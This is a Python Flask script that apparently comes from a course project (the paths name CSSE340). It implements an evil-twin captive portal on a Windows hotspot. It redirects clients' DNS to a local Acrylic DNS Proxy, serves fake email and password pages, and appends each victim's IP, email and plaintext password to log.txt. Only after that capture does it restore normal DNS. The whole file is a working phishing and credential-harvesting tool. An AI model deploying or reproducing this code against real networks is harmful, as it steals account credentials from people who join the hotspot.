import os
import signal
import sys
import time
import shutil
from flask import Flask, render_template, request, redirect

app = Flask(__name__)

BLOCK_CMD = 'netsh advfirewall firewall add rule name="Block Hotspot Clients" dir=out action=block remoteip=192.168.137.2-192.168.137.255'
UNBLOCK_CMD = 'netsh advfirewall firewall delete rule name="Block Hotspot Clients"'
GOOD_DNS = 'netsh interface ip set dns "Local Area Connection* 2" static 8.8.8.8'
BAD_DNS = 'netsh interface ip set dns "Local Area Connection* 2" static 127.0.0.1'
STOP_DNS_CMD = 'net stop AcrylicDNSProxySvc'
START_DNS_CMD = 'net start AcrylicDNSProxySvc'

#TODO: Remove hard coded paths
DNS_INI_PATH = "C:\\Program Files (x86)\\Acrylic DNS Proxy\\AcrylicConfiguration.ini"
BLOCKED_INI = "C:\\Users\\brownjs\\Desktop\\CSSE340\\AcrylicConfigurationBLOCKED.ini"
UNBLOCKED_INI = "C:\\Users\\brownjs\\Desktop\\CSSE340\\AcrylicConfigurationCLEAN.ini"

def block_clients():
    os.system(BAD_DNS)


def unblock_clients():
    os.system(GOOD_DNS)

def stop_DNS():
    os.system(STOP_DNS_CMD)

def start_DNS():
    os.system(START_DNS_CMD)

def set_DNS_config(blocked=True):
    stop_DNS() 
    try:
        if blocked:
            shutil.copy(BLOCKED_INI, DNS_INI_PATH)
        else:
            shutil.copy(UNBLOCKED_INI, DNS_INI_PATH)
    except Exception as e:
        print(f"Error switching DNS config: {e}")
    time.sleep(3)
    start_DNS()

def cleanup_and_exit():

    set_DNS_config(blocked=False)

    unblock_clients()

    sys.exit(0)

@app.route('/')
def login():
    return render_template('login.html')

@app.route('/authenticate', methods=['POST'])
def authenticate():
    email = request.form.get('email')
    
    if not email:
        return redirect('/')
    
    return render_template('password.html', email=email)

@app.route('/verify', methods=['POST'])
def verify():
    email = request.form.get('email')
    password = request.form.get('password')
    ip_address = request.remote_addr

    log_entry = f"IP: {ip_address} | Email: {email} | Password: {password}"
    f = open("log.txt", "a")
    f.write(log_entry)
    f.close()

    print("ACCOUNT CAPTURED >>> View Logs")

    set_DNS_config(blocked=False)
    unblock_clients()
    
    return render_template('success.html')

if __name__ == '__main__':
    set_DNS_config(blocked=True)
    block_clients()
    os.system(BAD_DNS)

    signal.signal(signal.SIGINT, lambda sig, frame: cleanup_and_exit())

    app.run(host='0.0.0.0', port=80)